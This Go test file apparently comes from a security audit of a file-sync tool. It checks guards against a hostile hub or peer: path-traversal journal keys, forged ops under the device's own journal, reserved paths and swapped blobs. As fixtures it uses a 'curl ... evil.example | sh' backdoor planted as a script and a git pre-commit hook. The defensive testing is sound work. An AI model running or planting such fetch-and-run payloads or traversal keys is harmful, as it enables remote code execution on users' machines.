package syncer

// Round 9. Round 8 reverted 48 guards on scoreboard row 15 one at a time and
// the TestSec suite caught 20 — a 57% false-negative rate. Eight of the misses
// were replaced in sec_audit3_test.go; this file is the rest, plus the two
// leads round 8 flagged as possible LIVE holes rather than merely untested
// guards (pull's journal-name slash check and pull's own-journal skip).
//
// The lesson of round 8 is structural: a whole-Cycle fixture routes through
// several guards that enforce the same rule, so reverting one leaves the suite
// green and the test proves nothing about the guard it names. Every test here
// is therefore built so ONLY the guard under test can produce the refusal —
// which for a guard inside scan/materialize/pull/push means calling that
// function directly with a hand-built cache, filter or backend, rather than
// driving Cycle and hoping.
//
// Helper prefix: secaud5.

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/runbear-io/beardrive/internal/config"
	"github.com/runbear-io/beardrive/internal/journal"
	"github.com/runbear-io/beardrive/internal/remote"
	"github.com/runbear-io/beardrive/internal/store"
)

// ---- helpers ----

// secaud5Hub is a remote.Backend that answers exactly what a hostile or
// compromised hub chooses to answer. `pull` takes a remote.Backend, not an
// *httpBackend, so this IS the interface the syncer is written against: the
// package's own rule (stated on unsafeRel, on materialize, on withdrawn) is
// that everything arriving over that seam is a peer's or a hub's string, and
// the syncer re-checks it rather than trusting the layer below.
//
// It deliberately does NOT implement remote.ReadReporter, so a Cycle driven
// through it does not also exercise the read-spool drain.
type secaud5Hub struct {
	objs    []remote.Object
	bodies  map[string][]byte
	listErr error
	puts    map[string][]byte
}

func (h *secaud5Hub) List(context.Context, string) ([]remote.Object, error) {
	if h.listErr != nil {
		return nil, h.listErr
	}
	return h.objs, nil
}

func (h *secaud5Hub) Get(_ context.Context, key string) (io.ReadCloser, error) {
	b, ok := h.bodies[key]
	if !ok {
		return nil, fmt.Errorf("no such object %q", key)
	}
	return io.NopCloser(bytes.NewReader(b)), nil
}

func (h *secaud5Hub) Put(_ context.Context, key string, r io.Reader, _ int64) error {
	b, err := io.ReadAll(r)
	if err != nil {
		return err
	}
	if h.puts == nil {
		h.puts = map[string][]byte{}
	}
	h.puts[key] = b
	return nil
}

func (h *secaud5Hub) Exists(_ context.Context, key string) (bool, error) {
	_, ok := h.bodies[key]
	return ok, nil
}

func (h *secaud5Hub) Close() error { return nil }

// secaud5Journal marshals ops the way a journal object holds them.
func secaud5Journal(t *testing.T, ops []journal.Op) []byte {
	t.Helper()
	data, err := journal.Marshal(ops)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// secaud5VolumeDir is the volume store's root, derived from the one path the
// store exposes. journal/ lives directly under it, so it is the directory a
// journal-name escape lands one level above.
func secaud5VolumeDir(s *Session) string {
	return filepath.Dir(filepath.Dir(s.Store.JournalPath("x")))
}

// secaud5Project writes a .bdrive/config.json with an include list — the
// legacy per-device scope that does NOT sync, which is exactly why pruneOps
// must not read it.
func secaud5Project(t *testing.T, folder string, include []string) {
	t.Helper()
	dir := filepath.Join(folder, config.ProjectDir)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := `{"id":"m-aud5only","volume":"v","remote":"https://hub.example/p/v"`
	if len(include) > 0 {
		body += `,"include":["` + strings.Join(include, `","`) + `"]`
	}
	body += "}"
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// secaud5Blob stores content in a device's OWN volume store and returns its
// sha, for the tests that call materializeFile directly (no pull involved).
func secaud5Blob(t *testing.T, s *Session, content string) string {
	t.Helper()
	sum, _, err := s.Store.PutBlobBytes([]byte(content))
	if err != nil {
		t.Fatal(err)
	}
	return sum
}

// ---- Part 1, lead 1: pull's journal-name slash check ----

// TestSec_Pull_AHubChosenJournalKeyCannotEscapeTheVolumeDir
//
// `name` in pull is a HUB-CHOSEN object key with "journal/" trimmed off it,
// and it becomes store.JournalPath(dev) — filepath.Join(volume, "journal",
// dev+".jsonl"), which validates nothing. A key of "journal/../evil.jsonl"
// therefore names a file one directory above the journal dir, and pull writes
// the hub's bytes there with store.WriteFileAtomic.
//
// The refusal under test is pull's own: `strings.Contains(name, "/")`.
// remote/http.go's List filter (round 4, TestSec_HTTP_ListedKeysFromTheHubStay-
// InTheKeySpace) refuses these keys one layer up for the https backend, so this
// is the syncer's half of a two-layer boundary — and it is the only half that
// covers a backend whose List does not filter. Driving this through a real
// httpBackend would measure the OTHER layer, which is precisely the structural
// masking round 8 was about, so the hostile keys are delivered at the seam pull
// actually reads.
func TestSec_Pull_AHubChosenJournalKeyCannotEscapeTheVolumeDir(t *testing.T) {
	victim := newDevice(t, "victim", nil)
	vol := secaud5VolumeDir(victim)

	const content = "planted by the hub"
	blob := sha256hex(content)
	body := secaud5Journal(t, []journal.Op{secjrnOp(1, "notes/ok.md", blob, len(content))})

	hostile := []string{
		"journal/../escaped.jsonl",           // one level up: the volume dir itself
		"journal/../../escaped-two-up.jsonl", // above the volume dir
		"journal/sub/nested.jsonl",           // a subdirectory of the journal dir
	}
	hub := &secaud5Hub{bodies: map[string][]byte{"blobs/" + blob: []byte(content)}}
	// Control FIRST in the listing: an ordinary peer journal. If this one does
	// not land, pull never ran and the rest proves nothing — and it has to be
	// ahead of the hostile keys, since a refusal further down may end the loop.
	ctrl := "journal/peer.jsonl"
	hub.objs = append(hub.objs, remote.Object{Key: ctrl, Size: int64(len(body))})
	hub.bodies[ctrl] = body
	for _, k := range hostile {
		hub.objs = append(hub.objs, remote.Object{Key: k, Size: int64(len(body))})
		hub.bodies[k] = body
	}
	victim.Backend = hub

	// pull's error is not the assertion: the filesystem is. A hostile key that
	// merely fails to be written is still a hub choosing a path on this disk.
	newOps, _, perr := victim.pull(context.Background())
	if len(newOps) == 0 {
		t.Fatalf("control: the ordinary journal in the same listing was not pulled (%v), so nothing is proven", perr)
	}
	if _, err := os.Stat(victim.Store.JournalPath("peer")); err != nil {
		t.Fatalf("control: the ordinary journal was not written locally: %v", err)
	}

	for _, p := range []string{
		filepath.Join(vol, "escaped.jsonl"),
		filepath.Join(filepath.Dir(vol), "escaped-two-up.jsonl"),
		filepath.Join(vol, "journal", "sub", "nested.jsonl"),
	} {
		if _, err := os.Stat(p); err == nil {
			t.Errorf("a hub-chosen journal key wrote %s — outside the volume's journal dir %s, at a path the hub named",
				p, filepath.Join(vol, "journal"))
		}
	}
}

// ---- Part 1, lead 2: pull's own-journal skip ----

// TestSec_Pull_TheHubsCopyOfOurOwnJournalCannotOverwriteIt
//
// "Each device writes only its own journal" is the invariant the whole
// concurrency design rests on — it is why no locking service exists. pull's
// `if dev == s.Device.ID { continue }` is the only thing enforcing the reading
// half of it: without it, the hub's copy of OUR journal is treated like a
// peer's, byte-compared against the local file, and store.WriteFileAtomic
// overwrites the local journal with whatever the hub is serving.
//
// The hub is the one party that can do this, because it holds every device's
// journal object. A compromised hub (or a member with write access to the
// storage root, which is what a `file://` hub is) appends ops under the
// victim's device id: they land in the victim's OWN journal file, replay into
// the victim's working folder, and are then pushed onward SIGNED AS the victim
// on the next cycle.
//
// The delta that makes this the server's decision and not the fixture: the
// exact same ops, published under a DIFFERENT device id, are pulled and applied
// normally (asserted below). Only the device's own id must be refused.
func TestSec_Pull_TheHubsCopyOfOurOwnJournalCannotOverwriteIt(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	// The victim syncs one ordinary file, so it has a real journal on the hub.
	write(t, victim.Folder, "mine.md", "the victim's own work")
	cycle(t, victim)
	mine, err := victim.Store.DeviceOps(victim.Device.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(mine) != 1 {
		t.Fatalf("setup: expected 1 own op, got %d", len(mine))
	}

	// The hub now serves a DOCTORED copy of the victim's own journal: its real
	// op, plus one the victim never authored.
	const backdoor = "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	blob := secjrnBlob(t, be, backdoor)
	forged := secjrnOp(2, "bin/backdoor.sh", blob, len(backdoor))
	forged.Device, forged.DeviceName, forged.Author = victim.Device.ID, victim.Device.Name, victim.Device.Author
	forged.Lamport = 99
	secjrnPush(t, be, victim.Device.ID, append(append([]journal.Op{}, mine...), forged))

	if _, err := secpeerCycle(t, victim); err != nil {
		t.Fatalf("cycle: %v", err)
	}

	after, err := victim.Store.DeviceOps(victim.Device.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, op := range after {
		if op.Path == "bin/backdoor.sh" {
			t.Errorf("the hub's copy of this device's OWN journal was accepted: an op the device never authored (%s %s) is now in %s and will be pushed onward signed as this device",
				op.Kind, op.Path, victim.Store.JournalPath(victim.Device.ID))
		}
	}
	if len(after) != len(mine) {
		t.Errorf("this device's own journal went from %d ops to %d — the hub rewrote a log only this device may write", len(mine), len(after))
	}
	if _, err := os.Stat(filepath.Join(victim.Folder, "bin", "backdoor.sh")); err == nil {
		t.Errorf("the forged op materialized in the working folder")
	}

	// The delta: the SAME op under a peer's device id is ordinary traffic and
	// must be applied. If this does not land, the test above proved nothing
	// about the own-journal rule.
	peerOp := forged
	peerOp.Device, peerOp.DeviceName, peerOp.Seq = "peer", "peer", 1
	peerOp.Path = "bin/peer-supplied.sh"
	secjrnPush(t, be, "peer", []journal.Op{peerOp})
	if _, err := secpeerCycle(t, victim); err != nil {
		t.Fatalf("cycle: %v", err)
	}
	if _, err := os.Stat(filepath.Join(victim.Folder, "bin", "peer-supplied.sh")); err != nil {
		t.Fatalf("control: an ordinary peer's op did not materialize (%v) — the refusal above may not be about the device id at all", err)
	}
}

// ---- neverSync's reserved-FILE clause ----

// TestSec_NeverSync_TheAtomicWriteTempPrefixIsNeverAPathWeCarry
//
// neverSync's last clause is config.ReservedName on the base name. It is the
// only thing standing between a peer's journal and a materialized
// ".bdrive-tmp-*" file — the prefix store.WriteFileAtomic uses and the SCANNER
// IS DOCUMENTED TO IGNORE, so a planted one is a file that lands on every
// teammate's disk and which no later scan will ever journal, notice or clean
// up. Asserted on the predicate itself, at every depth and in the case
// variants ReservedName folds, because a whole-Cycle fixture cannot say which
// of neverSync's three clauses refused.
func TestSec_NeverSync_TheAtomicWriteTempPrefixIsNeverAPathWeCarry(t *testing.T) {
	for _, rel := range []string{
		".bdrive-tmp-evil",
		"notes/.bdrive-tmp-evil",
		"a/b/c/.bdrive-tmp-123456",
		".BDRIVE-TMP-evil",
		"notes/.Bdrive-Tmp-x",
		".DS_Store",
		"notes/.ds_store",
	} {
		if !neverSync(rel) {
			t.Errorf("neverSync(%q) = false — a peer can materialize a name BearDrive is defined never to produce, and no later scan will journal, notice or clean it up", rel)
		}
	}
	// The other direction, so the clause cannot be "widened" into refusing
	// everything: ordinary paths still sync.
	for _, rel := range []string{"notes/ok.md", ".bdriveignore", "bdrive-tmp-not-hidden.md", "a/.bdriverc"} {
		if neverSync(rel) {
			t.Errorf("neverSync(%q) = true — an ordinary path stopped syncing", rel)
		}
	}
}

// ---- Filter.Skip: are the ignore rules applied at all? ----

// TestSec_Filter_IgnoredPathsNeverLeaveTheMachine
//
// No TestSec_* asserted that .bdriveignore is APPLIED. Every rule-related
// security test so far measures a downstream consequence (prune's refusal, the
// nested-mount boundary, "leaving scope is not a delete"), all of which still
// hold when Skip stops consulting the rules — and what Skip is actually FOR is
// the confidentiality boundary: the user names the files that must not leave
// this machine, and scan is where that is enforced. Without it, the first sync
// after `bdrive init` pushes .env, private keys, and every credential the
// seeded .bdriveignore exists to keep out of a shared hub.
//
// Asserted on what reached the hub (the replayed journals), not on the local
// disk, because "did not sync" is the property — the files stay on disk either
// way.
func TestSec_Filter_IgnoredPathsNeverLeaveTheMachine(t *testing.T) {
	be := sharedRemote(t)
	a := newDevice(t, "deva", be)

	write(t, a.Folder, IgnoreFile, "secrets/\n.env\n*.pem\n")
	write(t, a.Folder, "secrets/aws-creds.txt", "AKIA...")
	write(t, a.Folder, ".env", "DATABASE_URL=postgres://user:pw@host/db")
	write(t, a.Folder, "deploy/server.pem", "-----BEGIN PRIVATE KEY-----")
	write(t, a.Folder, "notes/ok.md", "ordinary shared content")
	cycle(t, a)

	state := hubState(t, a)
	if _, ok := state["notes/ok.md"]; !ok {
		t.Fatal("control: nothing synced at all, so the ignore rules were never exercised")
	}
	for _, secret := range []string{"secrets/aws-creds.txt", ".env", "deploy/server.pem"} {
		if _, ok := state[secret]; ok {
			t.Errorf("%s reached the hub — a path %s excludes was scanned, journaled, its content stored as a blob and pushed", secret, IgnoreFile)
		}
	}

	// The same rule on the receiving side: a peer that pushes one of these
	// anyway must not have it written here either.
	victim := newDevice(t, "victim", be)
	write(t, victim.Folder, IgnoreFile, "secrets/\n.env\n*.pem\n")
	blob := secjrnBlob(t, be, "pushed anyway")
	secjrnPush(t, be, "attacker", []journal.Op{
		secjrnOp(1, "secrets/aws-creds.txt", blob, len("pushed anyway")),
		secjrnOp(2, ".env", blob, len("pushed anyway")),
		secjrnOp(3, "notes/ok2.md", blob, len("pushed anyway")),
	})
	cycle(t, victim)
	if !exists(t, victim.Folder, "notes/ok2.md") {
		t.Fatal("control: the peer's ordinary op did not materialize")
	}
	for _, secret := range []string{"secrets/aws-creds.txt", ".env"} {
		if exists(t, victim.Folder, secret) {
			t.Errorf("a peer's op wrote %s, a path this device's %s excludes", secret, IgnoreFile)
		}
	}
}

// ---- the nested-mount boundary: the discovered list, and its carry ----

// TestSec_Filter_SkipHonorsTheNestedMountsTheWalkDiscovered
//
// Filter.nested is what walkFolder records when it meets a subdirectory that
// is a mount of its own. It is a PROJECT boundary (a different member list),
// not an ignore rule, and Skip consults it before anything else.
//
// Asserted on the filter directly, with the list populated the way walkFolder
// populates it and NO root, so the answer can only come from the discovered
// list and not from Filter.underMountOnDisk's stat of the real filesystem.
//
// MEASURED (round 9): with a root set — which loadFilter, the only constructor,
// always does — underMountOnDisk answers the same question, so the discovered
// list is redundant in production exactly like the reload carry above. What
// this test pins is Skip's stated contract rather than a live hole.
func TestSec_Filter_SkipHonorsTheNestedMountsTheWalkDiscovered(t *testing.T) {
	f := &Filter{} // no root: the on-disk fallback cannot answer, only the list can
	f.addNestedMount("sub")
	for _, rel := range []string{"sub/secret.md", "sub/deep/inner.md"} {
		if !f.Skip(rel) {
			t.Errorf("Filter.Skip(%q) = false with %q discovered as a nested mount — this project would read from and write into another project's working folder", rel, "sub")
		}
	}
	if f.Skip("subtle/notes.md") {
		t.Error(`Filter.Skip("subtle/notes.md") = true — a sibling whose name merely starts with the mount's stopped syncing`)
	}
	if f.Skip("notes/ok.md") {
		t.Error("an unrelated path stopped syncing")
	}
}

// TestSec_Cycle_ANestedMountSurvivesAPulledIgnoreFile
//
// Cycle reloads the filter when a pulled .bdriveignore lands, and carries
// filter.nested across the reload by hand. .bdriveignore is an ordinary synced
// file any member may edit, so without the carry a peer drops the project
// boundary by touching the rules in the same push.
//
// This restates TestSec_SyncPeer_IgnoreFileReloadCannotDropTheNestedMount-
// Boundary with the nested mount sitting inside a directory the OLD rules
// pruned — walkFolder stops at a pruned directory and never looks for a mount
// inside it, so the discovered list is empty for it and the reload has nothing
// to carry. That is the case Filter.underMountOnDisk was added for, and this
// pins both halves at once: the boundary must hold whichever of the two found
// it.
//
// MEASURED (round 9): the carry itself is now DEAD. Delete `nested :=
// filter.nested` / `filter.nested = nested` and this test, and every other test
// in the suite, still passes — because underMountOnDisk (round 5) answers the
// same question authoritatively from the filesystem, and loadFilter is the only
// constructor of a Filter and always sets root. The carry is belt over braces,
// not a second guard, and it should not be counted as coverage. Removing
// underMountOnDisk instead DOES fail the pruned-directory arm below.
func TestSec_Cycle_ANestedMountSurvivesAPulledIgnoreFile(t *testing.T) {
	const hostile = "planted by a peer of the OUTER project"

	run := func(t *testing.T, pruneFirst bool, newRules string) bool {
		be := sharedRemote(t)
		victim := newDevice(t, "victim", be)
		secjrnProject(t, filepath.Join(victim.Folder, "sub"))
		write(t, victim.Folder, "sub/secret.md", "the inner project's own file")
		if pruneFirst {
			// The old rules exclude sub/ entirely, so the scan walk prunes it
			// and never discovers the mount inside.
			write(t, victim.Folder, IgnoreFile, "sub/\n")
		}

		blob := secjrnBlob(t, be, hostile)
		ops := []journal.Op{
			secjrnOp(1, "sub/planted.md", blob, len(hostile)),
			secjrnOp(2, IgnoreFile, secjrnBlob(t, be, newRules), len(newRules)),
		}
		secjrnPush(t, be, "attacker", ops)
		cycle(t, victim)
		return exists(t, victim.Folder, "sub/planted.md")
	}

	if run(t, false, "# rules from a peer\n*.log\n") {
		t.Error("a peer wrote into a nested mount by pushing " + IgnoreFile + " in the same batch (mount discovered by the scan walk)")
	}
	if run(t, true, "# the peer re-opens the directory\n") {
		t.Error("a peer wrote into a nested mount that the old rules had pruned — the walk never discovered it, so only the on-disk boundary could refuse, and it did not")
	}
}

// ---- pruneOps: the two clauses nothing held up ----

// TestSec_Prune_ReservedPathsAPeerPushedAreRemovedFromTheHub
//
// pruneOps' `|| neverSync(rel)` is what makes --prune treat the builtin
// exclusions exactly like ignore rules. The builtins are the paths the scan
// walk never uploads — .git/ and .bdrive/ — so anything the hub holds under
// one of them was put there by something that is not a scan: an older client,
// a direct /store PUT, or a peer that simply chose to. Those are the highest
// value objects in the store (git hooks, a mount's identity), they are invisible
// in every device's working folder because materialize refuses to write them,
// and --prune is the only tool that removes them.
func TestSec_Prune_ReservedPathsAPeerPushedAreRemovedFromTheHub(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)
	write(t, victim.Folder, "notes/ok.md", "ordinary content")
	cycle(t, victim)

	const hook = "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	blob := secjrnBlob(t, be, hook)
	secjrnPush(t, be, "attacker", []journal.Op{
		secjrnOp(1, ".git/hooks/pre-commit", blob, len(hook)),
		secjrnOp(2, ".bdrive/config.json", blob, len(hook)),
		secjrnOp(3, "notes/theirs.md", blob, len(hook)),
	})
	cycle(t, victim)
	if _, ok := hubState(t, victim)[".git/hooks/pre-commit"]; !ok {
		t.Fatal("setup: the reserved path never reached the shared state, so prune has nothing to remove")
	}

	prune(t, victim)

	state := hubState(t, victim)
	for _, rel := range []string{".git/hooks/pre-commit", ".bdrive/config.json"} {
		if _, ok := state[rel]; ok {
			t.Errorf("--prune left %s on the hub — a path the scan walk never produces, invisible in every working folder because materialize refuses it, and reachable by anyone who can PUT a journal", rel)
		}
	}
	if _, ok := state["notes/theirs.md"]; !ok {
		t.Error("control: --prune removed an ordinary peer file, so the refusal above is not about the builtin exclusions")
	}
}

// TestSec_Prune_ThisDevicesPrivateIncludeListCannotDeleteTeammatesFiles
//
// pruneOps loads its own filter with a nil include list, and the comment says
// why: .bdriveignore syncs, so every device agrees on it, but the include list
// lives in THIS device's .bdrive/config.json and does not sync. Reuse the
// cycle's main filter here and a device carrying the legacy include-list scope
// deletes, from the hub, for the whole team, every path outside its own private
// scope — the same hub-wide-delete hazard the `!`-rule refusal exists for, by a
// second door that no refusal covers because the CLI cannot see it.
func TestSec_Prune_ThisDevicesPrivateIncludeListCannotDeleteTeammatesFiles(t *testing.T) {
	be := sharedRemote(t)
	peer := newDevice(t, "peer", be)
	victim := newDevice(t, "victim", be)

	// The team's content, pushed by a whole-folder teammate.
	write(t, peer.Folder, "docs/handbook.md", "the team handbook")
	write(t, peer.Folder, "wiki/page.md", "a wiki page")
	write(t, peer.Folder, IgnoreFile, "*.log\n") // no `!` rules: the CLI clears the prune
	cycle(t, peer)

	// The victim syncs the same project with a legacy include-list scope: it
	// only materializes wiki/, and nothing about that is the team's business.
	secaud5Project(t, victim.Folder, []string{"wiki"})
	cycle(t, victim)

	filter, err := LoadFilter(victim.Folder, nil)
	if err != nil {
		t.Fatal(err)
	}
	if filter.Negated() {
		t.Fatal("setup: the CLI would have refused this prune, so nothing is proven")
	}

	prune(t, victim)

	if _, ok := hubState(t, victim)["docs/handbook.md"]; !ok {
		t.Error("--prune deleted docs/handbook.md from the hub for the whole team — this device's own, non-syncing include list decided what everyone keeps")
	}
}

// ---- pull: the blob hash check, and what a failed check costs ----

// TestSec_Pull_ABlobThatDoesNotHashToItsShaIsReportedAndCannotFreezeThePush
//
// pull verifies that fetched bytes hash to the sha the op names. Content
// addressing already protects the DISK on its own — PutBlobReader files bytes
// under their OWN hash, so HasBlob(op.Blob) stays false and materializeFile
// skips the path — which is why deleting the check leaves every existing test
// green, including TestSec_SyncPeer_BlobContentMustHashToTheShaTheOpNames.
//
// What the check adds is the only SIGNAL a device ever gets that its hub is
// serving bytes that are not what they are addressed as. Without it the case is
// indistinguishable from "that blob has not been uploaded yet", which is normal,
// transient and silent — so a hub substituting content for a hash is a
// permanently invisible event on every device. That is worth a guard, and this
// asserts it: the cycle that meets the mismatch must SAY so.
//
// The other half is the cost of saying so. pull reports it by returning an
// error, and Cycle turns any pull error into res.Offline, which skips the push
// entirely. That is one cycle's push window spent on a peer's line of JSON, and
// it is one refactor away from the round-4 wedge class ("one peer op killed sync
// on every device that pulled it") — so the second half pins that it does NOT
// persist: the next cycle pushes.
func TestSec_Pull_ABlobThatDoesNotHashToItsShaIsReportedAndCannotFreezeThePush(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	const honest = "what the sha actually names"
	const swapped = "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	sum := sha256hex(honest)
	if err := be.Put(context.Background(), "blobs/"+sum, strings.NewReader(swapped), int64(len(swapped))); err != nil {
		t.Fatal(err)
	}
	secjrnPush(t, be, "attacker", []journal.Op{secjrnOp(1, "run.sh", sum, len(honest))})

	first, err := secpeerCycle(t, victim)
	if err != nil {
		t.Fatalf("cycle failed outright: %v", err)
	}
	// The disk half, already pinned elsewhere: the substituted bytes never land.
	if b, err := os.ReadFile(filepath.Join(victim.Folder, "run.sh")); err == nil && string(b) == swapped {
		t.Errorf("content that does not hash to its op's sha materialized: %q", b)
	}
	// The signal. Content addressing makes the mismatch harmless on disk and
	// therefore INVISIBLE — identical in every observable way to a blob that has
	// simply not been uploaded yet. The device has to notice out loud, or a hub
	// serving wrong bytes for a hash is an event nobody can ever detect.
	if !first.Offline || first.OfflineErr == nil {
		t.Errorf("the hub served bytes that do not hash to the sha its op names and the cycle reported nothing (Offline=%v err=%v) — the case is otherwise indistinguishable from an ordinary not-yet-uploaded blob",
			first.Offline, first.OfflineErr)
	} else if !strings.Contains(first.OfflineErr.Error(), "corrupt") {
		t.Errorf("the mismatch was reported as %q — it must name the blob and say what is wrong, or it reads as a network problem", first.OfflineErr)
	}

	// The device half. An ordinary local edit, on the very next cycle.
	write(t, victim.Folder, "mine.md", "my own work")
	res, err := secpeerCycle(t, victim)
	if err != nil {
		t.Fatalf("cycle: %v", err)
	}
	if res.LocalOps == 0 {
		t.Fatal("control: the local edit was not journaled at all")
	}
	if res.Offline {
		t.Errorf("one peer op naming a blob whose bytes do not match froze the whole device offline (%v) — and it is not transient: the correct bytes never arrive, so every later cycle re-fetches and re-fails", res.OfflineErr)
	}
	if !res.Pushed {
		t.Errorf("this device's own later edit was never pushed (res %+v) — one line of JSON from a peer stopped it syncing, permanently", res)
	}
}

// TestSec_ShortSha_ABlobStringShorterThanTwelveBytesIsNotSliced
//
// shortSha exists because op.Blob is arbitrary JSON off a peer's journal and
// the message that reports a corrupt blob slices it. The round-4 test that was
// meant to hold this up drives a whole cycle whose hostile blobs 404, so the
// Get fails and the slice is never reached — the bound has never actually been
// exercised. Called directly, it is.
func TestSec_ShortSha_ABlobStringShorterThanTwelveBytesIsNotSliced(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("shortSha panicked on a peer-supplied blob string: %v — that is a crashed daemon on every device that pulls the line", r)
		}
	}()
	for _, s := range []string{"", "a", "deadbeef", strings.Repeat("f", 11), strings.Repeat("f", 12), strings.Repeat("f", 64)} {
		got := shortSha(s)
		if len(got) > 12 {
			t.Errorf("shortSha(%q) = %q — %d bytes, the bound is 12", s, got, len(got))
		}
		if len(s) <= 12 && got != s {
			t.Errorf("shortSha(%q) = %q — a string within the bound was altered", s, got)
		}
	}
}

// ---- materializeFile: the two refusals that protect a file already on disk ----

// TestSec_Materialize_AnUntrackedLocalFileIsNotClobberedByAPeersOp
//
// materializeFile's untracked-adopt clause: when the cache has never seen this
// path but a file is already sitting there, the file is adopted only if it
// hashes to exactly the content the op names — otherwise it is left alone for
// the next scan to journal.
//
// A whole-Cycle fixture cannot test this, because scan runs first and tracks
// the file, so the `!ok` arm is never taken. It IS taken in real life: any file
// created between the scan and the materialize of the same cycle, any path a
// filter previously excluded (dropped from the cache without a delete op) and a
// pulled .bdriveignore has just re-included, and every path on a device whose
// state cache was lost while the working folder survived — the case
// TestSec_Store_CacheKeysCannotNameAPathOutsideTheVolume also lives in.
// Without the clause a peer's op silently overwrites local content that was
// never journaled anywhere, so there is no version of it to restore.
func TestSec_Materialize_AnUntrackedLocalFileIsNotClobberedByAPeersOp(t *testing.T) {
	victim := newDevice(t, "victim", nil)

	const local = "my own draft, never journaled anywhere"
	const theirs = "the peer's version"
	write(t, victim.Folder, "notes/draft.md", local)
	want := journal.FileState{Blob: secaud5Blob(t, victim, theirs), Size: int64(len(theirs)), Mode: 0o644}

	cache := map[string]store.CachedFile{} // the path is UNTRACKED
	wrote, err := victim.materializeFile("notes/draft.md", want, cache)
	if err != nil {
		t.Fatalf("materializeFile: %v", err)
	}
	if got := read(t, victim.Folder, "notes/draft.md"); got != local {
		t.Errorf("an untracked local file was overwritten by a peer's op: %q — the content was never journaled, so there is no version of it to restore", got)
	}
	if wrote {
		t.Error("materializeFile reported a write over an untracked file it should have left for the next scan")
	}

	// The delta: an untracked file whose content IS what the op names is
	// adopted, so the refusal above is about the mismatch and not about
	// untracked files in general.
	write(t, victim.Folder, "notes/same.md", theirs)
	if _, err := victim.materializeFile("notes/same.md", want, cache); err != nil {
		t.Fatalf("adopting an identical untracked file failed: %v", err)
	}
	if _, ok := cache["notes/same.md"]; !ok {
		t.Error("control: an identical untracked file was not adopted, so the mismatch refusal proves nothing")
	}
}

// TestSec_Materialize_AnOpWhoseBlobWasNeverFetchedCreatesNothing
//
// materializeFile's HasBlob check. Without it the path falls through to
// writeFile, whose first act after the boundary check is MkdirAll — so an op
// naming content the device does not hold still creates that op's whole parent
// chain in every teammate's working folder, and only then fails on OpenBlob.
//
// A journal can name a blob that was never pushed (pull explicitly survives
// that case rather than treating it as a contradiction), so the directory tree
// is free for any peer to write: empty folders appear in everyone's folder, get
// picked up by editors and backup tools, and nothing ever removes them because
// no op and no cache entry refers to them.
func TestSec_Materialize_AnOpWhoseBlobWasNeverFetchedCreatesNothing(t *testing.T) {
	victim := newDevice(t, "victim", nil)

	want := journal.FileState{Blob: sha256hex("content that was never pushed"), Size: 12, Mode: 0o644}
	cache := map[string]store.CachedFile{}
	wrote, err := victim.materializeFile("a/b/c/ghost.md", want, cache)
	if err != nil {
		t.Fatalf("an op with no content behind it must be a quiet retry, not an error: %v", err)
	}
	if wrote {
		t.Error("materializeFile reported a write for content it does not hold")
	}
	if _, ok := cache["a/b/c/ghost.md"]; ok {
		t.Error("the state cache recorded a path that was never written")
	}
	if _, err := os.Stat(filepath.Join(victim.Folder, "a")); err == nil {
		t.Errorf("an op naming a blob this device never fetched created %s in the working folder — a peer chooses the tree, nothing later removes it",
			filepath.Join(victim.Folder, "a", "b", "c"))
	}
}

// ---- the "never clobber dirty files" invariant, both halves ----

// TestSec_Materialize_AFileEditedMidCycleIsNotOverwritten
//
// "Materialize never clobbers dirty files" is a stated invariant of this
// repo, and the write half of it had no test at all. The window is real and
// small: scan runs at the top of the cycle, the pull that follows takes network
// time, and anything the user (or an agent, mid-run) writes in between has a
// size/mtime that no longer matches the cache fingerprint. Clobbering it loses
// an edit that was never journaled — the one case where the content is not
// recoverable from the blob store.
//
// Driven straight at materializeFile with the fingerprint mismatch the window
// produces, because through Cycle the scan re-fingerprints the file first and
// the window closes before materialize sees it.
func TestSec_Materialize_AFileEditedMidCycleIsNotOverwritten(t *testing.T) {
	victim := newDevice(t, "victim", nil)

	const scanned = "what the scan saw"
	const edited = "what the user typed while the pull was in flight"
	const theirs = "the peer's version"
	write(t, victim.Folder, "notes/live.md", scanned)
	cache := map[string]store.CachedFile{"notes/live.md": {
		Blob: secaud5Blob(t, victim, scanned), Size: int64(len(scanned)), Mode: 0o644,
		MTimeNS: time.Now().Add(-time.Hour).UnixNano(),
	}}
	// The edit that lands after the scan and before the materialize.
	write(t, victim.Folder, "notes/live.md", edited)

	want := journal.FileState{Blob: secaud5Blob(t, victim, theirs), Size: int64(len(theirs)), Mode: 0o644}
	wrote, err := victim.materializeFile("notes/live.md", want, cache)
	if err != nil {
		t.Fatalf("materializeFile: %v", err)
	}
	if got := read(t, victim.Folder, "notes/live.md"); got != edited {
		t.Errorf("a file that changed between this cycle's scan and its materialize was overwritten: %q — the edit was never journaled, so it is not in any blob and cannot be restored", got)
	}
	if wrote {
		t.Error("materializeFile reported a write over a dirty file")
	}
}

// TestSec_Materialize_ADirtyFileIsNotDeletedByTheDeleteLoop
//
// The delete half of the same invariant. materialize's second loop unlinks
// every cache key the replayed target no longer holds, and its dirty check is
// the only thing that distinguishes "the file we put there and a peer has since
// deleted" from "a file the user has just rewritten". Without it, a peer's
// delete op racing a local edit removes the local file outright.
//
// Driven at materialize directly with an empty target, so the delete loop is
// the only thing running: through Cycle the scan would journal the edit first
// and the target would still hold the path.
func TestSec_Materialize_ADirtyFileIsNotDeletedByTheDeleteLoop(t *testing.T) {
	victim := newDevice(t, "victim", nil)

	const scanned = "what the scan saw"
	const edited = "what the user typed while the pull was in flight"
	write(t, victim.Folder, "notes/live.md", scanned)
	cache := map[string]store.CachedFile{"notes/live.md": {
		Blob: secaud5Blob(t, victim, scanned), Size: int64(len(scanned)), Mode: 0o644,
